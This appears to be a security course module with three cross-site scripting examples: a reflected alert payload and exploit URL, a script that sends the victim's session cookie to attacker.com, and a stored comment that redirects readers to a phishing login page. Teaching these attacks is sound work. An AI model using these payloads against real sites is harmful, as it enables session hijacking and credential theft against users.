# Module 09 Examples: Cross-Site Scripting (XSS)

## 1. Basic Reflected XSS
A search feature reflects your input directly into the HTML without sanitization:
`<h1>You searched for: <?php echo $_GET['q']; ?></h1>`

**The Payload:**
```html
<script>alert('XSS Vulnerability Found!');</script>
```
**The Exploit URL:**
`http://vulnerable.com/search.php?q=<script>alert(1)</script>`

## 2. Stealing Session Cookies (Session Hijacking)
Instead of a harmless popup, an attacker uses XSS to send the victim's session cookie to their own server.

**The Payload:**
```html
<script>
  var i = new Image();
  i.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```
When the victim views the injected page, their browser silently requests the image from the attacker's server, appending their sensitive session cookie to the URL.

## 3. Stored XSS in a Comment Section
A blog allows users to post comments without validating the content.

**The Attacker Submits:**
```html
Great article!
<script>window.location.href="http://phishing-site.com/login";</script>
```
Every time a normal user opens that blog post, the script executes, redirecting them to a fake login page designed to steal their credentials.
